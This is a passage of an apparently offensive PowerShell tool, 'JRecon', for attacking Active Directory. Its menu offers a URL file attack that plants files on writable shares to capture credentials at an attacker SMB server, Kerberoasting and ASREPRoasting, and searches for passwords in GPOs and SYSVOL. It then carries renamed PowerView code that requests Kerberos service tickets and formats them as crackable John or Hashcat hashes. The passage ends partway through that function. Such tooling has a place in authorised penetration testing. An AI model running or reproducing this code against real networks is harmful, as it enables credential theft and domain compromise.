	if($jdownloadNessus){}
	else{
		if(Test-Path -Path $pwd\Tools\){}
		else{New-Item -Path $pwd\Tools\ -ItemType Directory | Out-Null}
		if(Test-Path -Path $pwd\Tools\Nessus.exe){}
		else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://www.tenable.com/downloads/api/v1/public/pages/nessus/downloads/17756/download?i_agree_to_tenable_license_agreement=true" -OutFile "$pwd\Tools\Nessus.exe"}}
	}
	Write-Host "Do you want to download " -NoNewline
	Write-Host "WinShareEnum" -ForegroundColor Yellow -NoNewline
	Write-Host ", " -NoNewline
	Write-Host "AdvIPScanner" -ForegroundColor Yellow -NoNewline
	Write-Host ", " -NoNewline
	Write-Host "VirtualBox" -ForegroundColor Yellow -NoNewline
	Write-Host " and " -NoNewline
	Write-Host "HFS" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
	$jdownloadtools = Read-Host
	if($jdownloadtools){}
	else{
		if(Test-Path -Path $pwd\Tools\){}
		else{New-Item -Path $pwd\Tools\ -ItemType Directory | Out-Null}
		if(Test-Path -Path $pwd\Tools\hfs.exe){}
		else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://github.com/rejetto/hfs2/releases/download/v2.4-rc07/hfs.exe" -OutFile "$pwd\Tools\hfs.exe"}}
		if(Test-Path -Path $pwd\Tools\WinShareEnum.exe){}
		else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://github.com/nccgroup/WinShareEnum/raw/master/Info/WinShareEnum.exe" -OutFile "$pwd\Tools\WinShareEnum.exe"}}
		if(Test-Path -Path $pwd\Tools\Advanced_IP_Scanner.exe){}
		else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe" -OutFile "$pwd\Tools\Advanced_IP_Scanner.exe"}}
		if(Test-Path -Path $pwd\Tools\VirtualBox.exe){}
		else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://download.virtualbox.org/virtualbox/7.0.2/VirtualBox-7.0.2-154219-Win.exe" -OutFile "$pwd\Tools\VirtualBox.exe"}}
	}
	Write-Host "Do you want to download " -NoNewline
	Write-Host "Kali OS" -ForegroundColor Yellow -NoNewline
	Write-Host " for VirtualBox ? (will run in background) Leave blank for YES: " -NoNewline
	$jdownloadkali = Read-Host
	if($jdownloadkali){}
	else{
		if(Test-Path -Path $pwd\Tools\){}
		else{New-Item -Path $pwd\Tools\ -ItemType Directory | Out-Null}
		if(Test-Path -Path $pwd\Tools\kali.7z){}
		else{start powershell -WindowStyle Hidden {Invoke-WebRequest -Uri "https://kali.download/virtual-images/kali-2022.3/kali-linux-2022.3-virtualbox-amd64.7z" -OutFile "$pwd\Tools\kali.7z"}}
	}
	
    Write-Host "Do you want to run the initial " -NoNewline
	Write-Host "Domain Enumeration" -ForegroundColor Yellow -NoNewline
	Write-Host " ? (This task may take a long time) Leave blank for YES: " -NoNewline
	$jenum = Read-Host
	
	Write-Host "Do you want to run " -NoNewline
	Write-Host "BloodHound Collection" -ForegroundColor Yellow -NoNewline
	Write-Host " ? (This task may take a long time) Leave blank for YES: " -NoNewline
	$jblood = Read-Host
	
	Write-Host "Do you want to download and run " -NoNewline
	Write-Host "PingCastle" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
    $jPingCastle = Read-Host
	if($jPingCastle){}
	else{
		if($jpingdownload){}
		elseif($jpingdownload -eq "https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip"){
			Write-Host "You haven't setup the " -ForegroundColor Yellow -NoNewline
			Write-Host "`$jpingdownload" -ForegroundColor Green -NoNewline
			Write-Host " variable, which means JRecon will download and run PingCastle Free Edition" -ForegroundColor Yellow
			Write-Host "PingCastle Free Edition is NOT FOR COMMERCIAL USE" -ForegroundColor Red
			Write-Host "Please setup the variable before running JRecon, like so:" -ForegroundColor Yellow
			Write-Host "`$jpingdownload = `"" -ForegroundColor Green -NoNewline
			Write-Host "<URL_To_PingCastle_Commercial_Version>" -ForegroundColor Cyan -NoNewline
			Write-Host "`"" -ForegroundColor Green
		}
		else{
			Write-Host "You haven't setup the " -ForegroundColor Yellow -NoNewline
			Write-Host "`$jpingdownload" -ForegroundColor Green -NoNewline
			Write-Host " variable, which means JRecon will download and run PingCastle Free Edition" -ForegroundColor Yellow
			Write-Host "PingCastle Free Edition is NOT FOR COMMERCIAL USE" -ForegroundColor Red
			Write-Host "Please setup the variable before running JRecon, like so:" -ForegroundColor Yellow
			Write-Host "`$jpingdownload = `"" -ForegroundColor Green -NoNewline
			Write-Host "<URL_To_PingCastle_Commercial_Version>" -ForegroundColor Cyan -NoNewline
			Write-Host "`"" -ForegroundColor Green
		}
	}
	
	Write-Host "Do you want to enumerate " -NoNewline
	Write-Host "Readable Shares" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
    $jshareask = Read-Host
    if($jshareask) {}
    else {
		$jpingquest = Read-Host -Prompt 'Do you want to use PingCastle to enumerate shares ? Leave blank for YES'
		if($jpingquest){
			if(Test-Path -Path $pwd\Recon_Report\CSV-Files\Computers.csv){}
			else{
				if($jenum -and $jshareask -eq "" -and $jpingquest){
				Write-Host "You have chosen not to run the initial enumeration, and to enumerate shares without using PingCastle" -ForegroundColor Red;
				Write-Host "A file named \Recon_Report\CSV-Files\Computers.csv does not exist in your working directory" -ForegroundColor Yellow;
				Write-Host "Please run the initial enumeration or specify an IP range to scan (don't select All Machines)" -ForegroundColor Yellow;
				}
			}
			
			$jrange = Read-Host -Prompt 'Comma separated IP ranges to enumerate Shares for ? (e.g.: 10.0.0.0/16,10.0.2.6/32) Leave blank for All Machines'
			}
		else{
			if($jPingCastle){
				if(Test-Path -Path $pwd\PingCastle\PingCastle.exe){}
				else{Write-Host "OK.. PingCastle will be downloaded" -ForegroundColor Green;}
			}
			else{}
			}
	}
	Write-Host "Do you want to enumerate " -NoNewline
	Write-Host "Writable Shares" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
	$jwritejwrite = Read-Host
    if($jwritejwrite){}
    else{
		if(Test-Path -Path $pwd\Shares_Accessible.txt){}
		else{
			if($jshareask){
				Write-Host "You have chosen to skip Shares enumeration. However, JRecon needs a list of Readable Shares to perform this task..." -ForegroundColor Red;
				Write-Host "Please create a file named Shares_Accessible.txt containing a list of Readable Shares" -ForegroundColor Yellow;
				Write-Host "Please use the following UNC format: " -ForegroundColor Yellow -NoNewline; Write-Host "\\WORKSTATION-03\Shared" -ForegroundColor Green;
				Write-Host "Otherwise re-run JRecon and enumerate Readable Shares first" -ForegroundColor Yellow;
			}
			else{}
		}
    }
	Write-Host "Do you want to run a " -NoNewline
	Write-Host "URL File Attack" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
	$jfileattack = Read-Host
    if($jfileattack) {
		Write-Host "Do you want to " -NoNewline
		Write-Host "clean" -ForegroundColor Yellow -NoNewline
		Write-Host " after a previous " -NoNewline
		Write-Host "URL File Attack" -ForegroundColor Yellow -NoNewline
		Write-Host " ? Leave blank for YES: " -NoNewline
		$jfileclean = Read-Host
		if($jfileclean) {}
		else{
			if($jsmbfilename) {}
			else{
				if(Test-Path -Path $pwd\Shares_Writable.txt){}
				else{
					if($jwritejwrite){
						Write-Host "For this to work, a file named Shares_Writable.txt (containing a list of writable shares) has to exist in your working directory" -ForegroundColor Red;
						Write-Host "You have chosen not to enumerate Writable Shares, so JRecon won't create this file for you" -ForegroundColor Yellow;
						Write-Host "Please use the following UNC format: " -ForegroundColor Yellow -NoNewline; Write-Host "\\WORKSTATION-03\Shared" -ForegroundColor Green;
						Write-Host "Otherwise re-run JRecon and enumerate Writable Shares first" -ForegroundColor Yellow;
					}
					else{}
				}
				Write-Host "It looks like JRecon does not know how you named the URL file..." -ForegroundColor Red;
				$jsmbfilenameclean = Read-Host -Prompt 'How did you previously name your file ? (Leave blank for Q4_Financial) No extension please'
			}
		}
    }
    else{
		if(Test-Path -Path $pwd\Shares_Writable.txt){}
		else{
			if($jwritejwrite){
				Write-Host "For this to work, a file named Shares_Writable.txt (containing a list of writable shares) has to exist in your working directory" -ForegroundColor Red;
				Write-Host "You have chosen not to enumerate Writable Shares, so JRecon won't create this file for you" -ForegroundColor Yellow;
				Write-Host "Please use the following UNC format: " -ForegroundColor Yellow -NoNewline; Write-Host "\\WORKSTATION-03\Shared" -ForegroundColor Green;
				Write-Host "Otherwise re-run JRecon and enumerate Writable Shares first" -ForegroundColor Yellow;
			}
			else{}
		}
		Write-Host "Remember to spin up your SMB server..." -ForegroundColor Cyan;
		Write-Host "In Kali, you can do so with the following command" -ForegroundColor Yellow;
		Write-Host "impacket-smbserver Share . -smb2support" -ForegroundColor Green;
		$jsmbserverip = Read-Host -Prompt 'What is your listening SMB server IP ?'
		$jsmbfilename = Read-Host -Prompt 'How do you want to name your file ? (Leave blank for Q4_Financial) No extension please'
    }
    Write-Host "Do you want to run a " -NoNewline
	Write-Host "Kerberoast" -ForegroundColor Yellow -NoNewline
	Write-Host " (and " -NoNewline
	Write-Host "ASREPRoast" -ForegroundColor Yellow -NoNewline
	Write-Host ") attack ? Leave blank for YES: " -NoNewline
	$jkerbask = Read-Host
    if($jkerbask) {}
    else {$jdomain = Read-Host -Prompt 'AD Domain to Kerberoast ? Leave blank for All Domains'}
	Write-Host "Do you want to check for presence of " -NoNewline
	Write-Host "Kerb Tickets" -ForegroundColor Yellow -NoNewline
	Write-Host " in your local machine ? (Requires Admin) Leave blank for YES: " -NoNewline
	$jlocaltickets = Read-Host
	
	Write-Host "Do you want to check for " -NoNewline
	Write-Host "Misconfigured Certificate Templates" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
	$jtemplates = Read-Host
	
	Write-Host "Do you want to enumerate for " -NoNewline
	Write-Host "Vulnerable GPOs" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
	$jvulnGPO = Read-Host
	
	Write-Host "Do you want to enumerate " -NoNewline
	Write-Host "LDAP Signing" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
    $jldap = Read-Host
	
	Write-Host "Do you want to check for " -NoNewline
	Write-Host "Exploitable Systems" -ForegroundColor Yellow -NoNewline
	Write-Host " ? Leave blank for YES: " -NoNewline
    $jexploitable = Read-Host
	
	Write-Host "Do you want to search for " -NoNewline
	Write-Host "Passwords in GPO" -ForegroundColor Yellow -NoNewline
	Write-Host " ? (This task may take a long time) Leave blank for YES: " -NoNewline
    $jgpo = Read-Host
	
	Write-Host "Do you want to search for " -NoNewline
	Write-Host "Passwords in SYSVOL/Netlogon" -ForegroundColor Yellow -NoNewline
	Write-Host " ? (This task may take a long time) Leave blank for YES: " -NoNewline
    $jsysvol = Read-Host
	
    Write-Host "Thanks! Let's start.." -ForegroundColor Green;
	echo ""
	echo ""
}

if ($jenum)
{
    Write-Host "Skipping Initial Enumeration..." -ForegroundColor Yellow;
}
else{
    Outvoke-ADRecon -GenExcel $GenExcel -Protocol $Protocol -Collect $Collect -DomainController $DomainController -Credential $Credential -OutputType $OutputType -ADROutputDir $OutputDir -DormantTimeSpan $DormantTimeSpan -PassMaxAge $PassMaxAge -PageSize $PageSize -Threads $Threads
    Write-Host "Done!" -ForegroundColor Green;
    Write-Output "`n"
    Write-Host "Piping User Description Field into a file for you..." -ForegroundColor Cyan;
    Import-csv .\Recon_Report\CSV-Files\Users.csv -Delimiter ',' | Select Username, Description | where-object {$_.Description -ne ""} > .\Description_field.txt
    Write-Host "Done!" -ForegroundColor Green;
    Write-Output "`n"
    Write-Host "Creating a list of Servers..." -ForegroundColor Cyan;
    Import-csv .\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select Name, "IPv4Address", "Operating System" | where-object {$_."Operating System" -like "Windows Server*"} > Servers.txt
    mv .\Servers.txt .\Recon_Report\.
    Write-Host "Done!" -ForegroundColor Green;
    Write-Output "`n"
    Write-Host "Creating a list of Hosts running Unsupported OS" -ForegroundColor Cyan;
    Import-csv .\Recon_Report\CSV-Files\Computers.csv -Delimiter ',' | Select Name, "IPv4Address", "Operating System" | where-object {($_."Operating System" -like "Windows Me*") -or ($_."Operating System" -like "Windows NT*") -or ($_."Operating System" -like "Windows 95*") -or ($_."Operating System" -like "Windows 98*") -or ($_."Operating System" -like "Windows XP*") -or ($_."Operating System" -like "Windows 7*") -or ($_."Operating System" -like "Windows Vista*") -or ($_."Operating System" -like "Windows 2000*") -or ($_."Operating System" -like "Windows 8*") -or ($_."Operating System" -like "Windows Server 2008*") -or ($_."Operating System" -like "Windows Server 2003*") -or ($_."Operating System" -like "Windows Server 2000*")} > Unsupported_OS.txt
    mv .\Unsupported_OS.txt .\Recon_Report\.
    Write-Host "Done!" -ForegroundColor Green;
    Write-Output "`n"
	Write-Host "Local Admins of this system" -ForegroundColor Cyan;
	$Admins = Get-WmiObject win32_groupuser | Where-Object { $_.GroupComponent -match 'administrators' -and ($_.GroupComponent -match "Domain=`"$env:COMPUTERNAME`"")} | ForEach-Object {[wmi]$_.PartComponent } | Select-Object Caption,SID | format-table -Wrap | Out-String
	$Admins
	$Admins > $pwd\Recon_Report\LocalAdmins.txt
	Write-Output "`n"
	Write-Host "Checking if AV is installed..." -ForegroundColor Cyan;
	$AV = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntiVirusProduct" 
	If($AV -ne ""){
		Write-Output "The following AntiVirus product appears to be installed:" $AV.displayName
		Write-Output "The following AntiVirus product appears to be installed:" $AV.displayName > $pwd\AV.txt
	}
	If($AV -eq ""){
		Write-Output "No AV detected."
		Write-Output "No AV detected." > $pwd\AV.txt
		Write-Output "`n"
	}
	Write-Output "`n"
	Write-Host "Checking for Local Admin Password Solution (LAPS)..." -ForegroundColor Cyan;
	try{
		$lapsfile = Get-ChildItem "$env:ProgramFiles\LAPS\CSE\Admpwd.dll" -ErrorAction Stop
		if ($lapsfile){
			Write-Output "The LAPS DLL (Admpwd.dll) was found. Local Admin password randomization may be in use."
			Write-Output "The LAPS DLL (Admpwd.dll) was found. Local Admin password randomization may be in use." > $pwd\LAPS.txt
		}
	}
	catch{
		Write-Output "The LAPS DLL was not found. Local Admin password randomization may not be in use."
		Write-Output "The LAPS DLL was not found. Local Admin password randomization may not be in use." > $pwd\LAPS.txt
	}
	Write-Output "`n"
    
}

if($jpingdownload){}

else{$jpingdownload = "https://github.com/vletoux/pingcastle/releases/download/2.11.0.1/PingCastle_2.11.0.1.zip"}

if($jPingCastle) {
	Write-Host "Skipping PingCastle..." -ForegroundColor Yellow;
}

else{

	echo ""
	Write-Host "Downloading and running PingCastle..." -ForegroundColor Cyan;

	if(Test-Path -Path $pwd\PingCastle\PingCastle.exe){}
	
	else{
	
		Invoke-WebRequest -Uri $jpingdownload -OutFile "$pwd\PingCastle.zip"

		Add-Type -AssemblyName System.IO.Compression.FileSystem
		function Unzip
		{
			param([string]$zipfile, [string]$outpath)

			[System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
		}

		Unzip "$pwd\PingCastle.zip" "$pwd\PingCastle\"
	
	}

	.\PingCastle\PingCastle.exe --healthcheck --server $jcurrentdomain
	
	Write-Host "Done!" -ForegroundColor Green;
	
	echo " "

        del .\PingCastle.zip

        del .\*.xml
}

If ($Log)
{
    Stop-Transcript
}

function GGet-DomainSearcher {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.DirectoryServices.DirectorySearcher')]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $TargetDomain = $Domain
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $DomainObject = GGet-Domain -Credential $Credential
            }
            else {
                $DomainObject = GGet-Domain
            }
            $TargetDomain = $DomainObject.Name
        }

        if (-not $PSBoundParameters['Server']) {
            try {
                if ($DomainObject) {
                    $BindServer = $DomainObject.PdcRoleOwner.Name
                }
                elseif ($PSBoundParameters['Credential']) {
                    $BindServer = ((GGet-Domain -Credential $Credential).PdcRoleOwner).Name
                }
                else {
                    $BindServer = ((GGet-Domain).PdcRoleOwner).Name
                }
            }
            catch {
                throw "[GGet-DomainSearcher] Error in retrieving PDC for current domain: $_"
            }
        }
        else {
            $BindServer = $Server
        }

        $SearchString = 'LDAP://'

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters['SearchBasePrefix']) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters['SearchBase']) {
            if ($SearchBase -Match '^GC://') {
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match '^LDAP://') {
                    if ($SearchBase -match "LDAP://.+/.+") {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        Write-Verbose "[GGet-DomainSearcher] search string: $SearchString"

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            Write-Verbose "[GGet-DomainSearcher] Using alternate credentials for LDAP connection"
            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters['ServerTimeLimit']) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters['Tombstone']) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters['LDAPFilter']) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters['SecurityMasks']) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                'None' { [System.DirectoryServices.SecurityMasks]::None }
                'Owner' { [System.DirectoryServices.SecurityMasks]::Owner }
                'Sacl' { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters['Properties']) {
            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function CConvert-LDAPProperty {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    Write-Verbose "[CConvert-LDAPProperty] error: $_"
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        Write-Warning "[CConvert-LDAPProperty] Error parsing LDAP properties : $_"
    }
}


function GGet-Domain {

    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters['Credential']) {

            Write-Verbose '[GGet-Domain] Using alternate credentials for GGet-Domain'

            if ($PSBoundParameters['Domain']) {
                $TargetDomain = $Domain
            }
            else {
                $TargetDomain = $Credential.GetNetworkCredential().Domain
                Write-Verbose "[GGet-Domain] Extracted domain '$TargetDomain' from -Credential"
            }

            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)

            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[GGet-Domain] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
            }
        }
        elseif ($PSBoundParameters['Domain']) {
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            catch {
                Write-Verbose "[GGet-Domain] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
            }
        }
        else {
            try {
                [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            }
            catch {
                Write-Verbose "[GGet-Domain] Error retrieving the current domain: $_"
            }
        }
    }
}



function GGet-DomainSPNTicket {

    [OutputType('PowerView.SPNTicket')]
    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
    Param (
        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern('.*/.*')]
        [Alias('ServicePrincipalName')]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
        [Object[]]
        $User,

        [ValidateSet('John', 'Hashcat')]
        [Alias('Format')]
        [String]
        $OutputFormat = 'John',

        [ValidateRange(0,10000)]
        [Int]
        $Delay = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $Jitter = .3,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')

        if ($PSBoundParameters['Credential']) {
            $LogonToken = Outvoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters['User']) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }
	
	$RandNo = New-Object System.Random

        ForEach ($Object in $TargetObject) {

            if ($PSBoundParameters['User']) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = 'UNKNOWN'
                $DistinguishedName = 'UNKNOWN'
            }

            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                Write-Warning "[GGet-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = New-Object PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
                        Write-Warning 'Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"'
                        $Hash = $null
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
                    }
                } else {
                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
                    $Hash = $null
                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    if ($OutputFormat -match 'John') {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne 'UNKNOWN') {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        }
                        else {
                            $UserDomain = 'UNKNOWN'
                        }

                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
                }

                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
